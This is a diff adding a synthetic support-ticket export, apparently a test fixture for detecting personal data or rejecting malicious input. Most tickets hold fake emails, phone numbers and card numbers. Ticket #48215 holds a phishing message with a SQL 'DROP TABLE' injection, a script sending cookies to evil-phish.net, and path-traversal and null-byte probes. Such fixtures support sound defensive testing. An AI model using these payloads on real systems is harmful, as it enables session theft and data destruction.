@@ -1,0 +1,95 @@
+SUPPORT TICKET EXPORT - CUSTOMER SERVICE SYSTEM
+Generated: 2026-09-07 08:42:15
+=====================================================================
+
+[Ticket #48213] Priority: High
+From: lan.keza@alueducation.com
+Subject: Unable to access student portal after payment
+
+Body:
+Hi, I tried paying my tuition fee of $1000 yesterday through the
+student portal at https://payments.alueducation.com/checkout?ref=48213&currency=usd
+but it kept failing. My card ending was charged though, so I used
+4539 1488 0343 6467 for the transaction.
+
+You can reach me on +250 788 523 656 or call the front desk at
+(078) 234-5678.
+
+Meeting was scheduled for 14:30 today but I missed it.
+Can we push it to 9:00 AM tomorrow instead?
+
+--------------------------------------------------------------
+
+[Ticket #48214] Priority: Low
+From: sarah.ira@alumni.alueducation.com
+Subject: Re: Alumni newsletter subscription
+
+Body:
+Please unsubscribe me from the newsletter. My new email is
+sarah.kagame92@gmail.com.
+
+I also found this article useful:
+https://alu.edu/blog/2026/careers
+
+Follow the updates here: #ALUAlumni #CareerGrowth.
+
+My old number was 0788 693 423 and my new one is
++1 (415) 555 0192.
+
+--------------------------------------------------------------
+
+[Ticket #48215] Priority: Critical - SECURITY REVIEW
+From: unknown_sender@tempmail-x.ru
+Subject: URGENT ACCOUNT VERIFICATION REQUIRED!!!
+
+Body:
+'; DROP TABLE students;-- click here
+http://bit.ly/3xF9aKq
+to verify your account or it will be
+<script>document.location='http://evil-phish.net/steal?cookie='+document.cookie</script>
+
+Enter your card number 6011 0009 9013 9424 and CVV immediately.
+
+Also try ../../../etc/passwd or %00 null byte injection %3Cscript%3E.
+
+--------------------------------------------------------------
+
+[Ticket #48216] Priority: Medium
+From: si.coordinator@si.alueducation.com
+Subject: SI session reschedule - Group B
+
+Body:
+The Supplemental Instruction session has moved from 16:00 to 17:45
+this Thursday.
+
+Room booking confirmed. Invoice attached for KES 3,500.00 facilities fee.
+
+Contact me at ext. 2231 or +254-712-345-678.
+
+Reference document:
+https://drive.google.com/file/d/1a2B3c4D5e/view?usp=sharing
+
+--------------------------------------------------------------
+
+[Ticket #48217] Priority: Low
+From: finance@eastafrica-services.com
+Subject: Invoice #INV-2026-0091
+
+Body:
+Attached invoice totals EUR 890.50 for laboratory equipment,
+payable via wire or card 3782 822463 10005 (Amex).
+
+Delivery contact: +250-72-000-1122.
+
+The supplier's finance team can be contacted for payment
+questions.
+
+The following malformed emails should be rejected:
+not-an-email@@bad..domain
+missing-at-sign.com
+bad @email .com
+
+My backup ALU email is:
+jane.doe123+admissions@alumni.alueducation.com
+=====================================================================
+END OF EXPORT - 5 TICKETS
